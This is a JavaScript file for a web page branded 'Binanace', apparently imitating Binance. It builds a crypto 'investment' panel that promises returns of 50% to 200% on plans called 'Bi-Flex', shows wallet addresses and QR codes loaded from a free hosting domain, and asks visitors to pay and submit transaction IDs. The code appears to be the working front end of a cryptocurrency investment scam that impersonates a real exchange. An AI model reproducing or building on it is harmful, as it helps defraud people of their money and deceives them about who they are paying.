const d = new Date();
$("#bnbFooter").html(`
<a href="#user_panel">&#8679; Top</a>
<div>Binanace - &copy;${d.getFullYear()}</div>
<div></div>
`);

function selectWallet(wallet, coin, icon, addr, barcode) {
    let planz = JSON.parse(localStorage.getItem("planz"));
    let token = btoa(localStorage.getItem("planz"));
    let symbol;
    let percentages;

    if (planz.currency == "USD") {
        symbol = "$"
    }
    else if (planz.currency == "EUR") {
        symbol = "€"
    }
    else if (planz.currency == "KRW") {
        symbol = "₩"
    }

    else if (planz.currency == "JPY") {
        symbol = "¥"
    }

    // 

    if (planz.plan == "Bi-Flex") {
        percentages = "50%"
    }
    else if (planz.plan == "Bi-Flex Mini") {
        percentages = "75%"
    }
    else if (planz.plan == "Bi-Flex Max") {
        percentages = "100%"
    }
    else if (planz.plan == "Bi-Flex Pro") {
        percentages = "200%"
    }

    // 

    let promoCode = JSON.parse(localStorage.getItem("promoCode"));
    if (wallet == "btc") {
        coin = "Bitcoin (BTC)";
        icon = "icon/bitcoin.png";
        addr = btc_wallet;
        barcode = "barcode/btc.jpg"
    }
    else if (wallet == "bnb") {
        coin = "Binance (BNB)";
        icon = "icon/bnb.png";
        addr = bnb_wallet;
        barcode = "barcode/bnb.jpg"
    }
    else if (wallet == "eth") {
        coin = "Ethereum (ETH)";
        icon = "icon/ethereum.png";
        addr = eth_wallet;
        barcode = "barcode/eth.jpg"
    }
    else if (wallet == "usdt") {
        coin = "Tether (USDT)";
        icon = "icon/tether.png";
        addr = usdt_wallet;
        barcode = "barcode/usdt.jpg"
    }
    else if (wallet == "doge") {
        coin = "DOGECOIN (DOGE)";
        icon = "icon/doge.png";
        addr = doge_wallet;
        barcode = "barcode/doge.jpg"
    }

    const targetWallet = `
    <section>
    <button id="reset_investment_btn" onclick="resetInvestmentPanel()">Reset</button>

    <div id="wallet_selected">

    <section id="wallet_header">
    <img src="http://logi-api.mywebcommunity.org/fb/${icon}"/>
    <span>${coin}</span>
    </section>

    <section id="wallet_approve">

    <div id="wallet_balance">
        <h2>Investment Portfolio</h2>
        <section class="wallet_side_note">
        <span>This transaction is pending, account will not be credited unless verified.</span>
        </section>

        <section>
        <p><b>Promo ID: </b> <span>${promoCode.code}</span></p>
        <p><b>Plan: </b> <span>${planz.plan}</span></p>
        <p><b>Investment: </b> <span>${symbol}${planz.amount}</span></p>
        <p><b>Cryptocurrency: </b> <span>${planz.coin.toUpperCase()}</span></p>
        <p><b>ROI: </b> <span>+${planz.times} on T.A.B </span></p>
        <p><b>Token: </b> <span class="copy_token">${token.slice(0, 15)}... </span> 
        <input type="hidden" class="hidden_token" id="hiddenTXID" value="${token}">
        <button onclick="copyToken(this)">Copy</button>
        </p>
        </section>
    </div>
    
    <div id="barcode_container">
        <h2>Proof of Investment</h2>
        <section class="wallet_side_note">
        <span>Copy or scan your Wallet Address and make desired payment to complete process.</span>
        </section>

        <section>
        <div>
        <img src="http://logi-api.mywebcommunity.org/fb/${barcode}" alt="${coin}"/>
        <input type="hidden" value="${addr}" id="coin_addr" class="copy_addr"/>
        <button onclick="copyCoinAddress(this)">Copy Address</button>
        </div>

        <div>
            <h4>Transaction ID:</h4>
            <span>
            <input class="confirm_transactions" type="text" placeholder="Enter Transaction ID"/>
            <button onclick="submitTransaction(this)">Submit</button>
            </span>
        </div>
        </section>
    </div>

    </section>

    </div>

    </section>
    `;

    $("#wallet_table").hide();
    $("#bnbMainContainer").html(targetWallet)
}


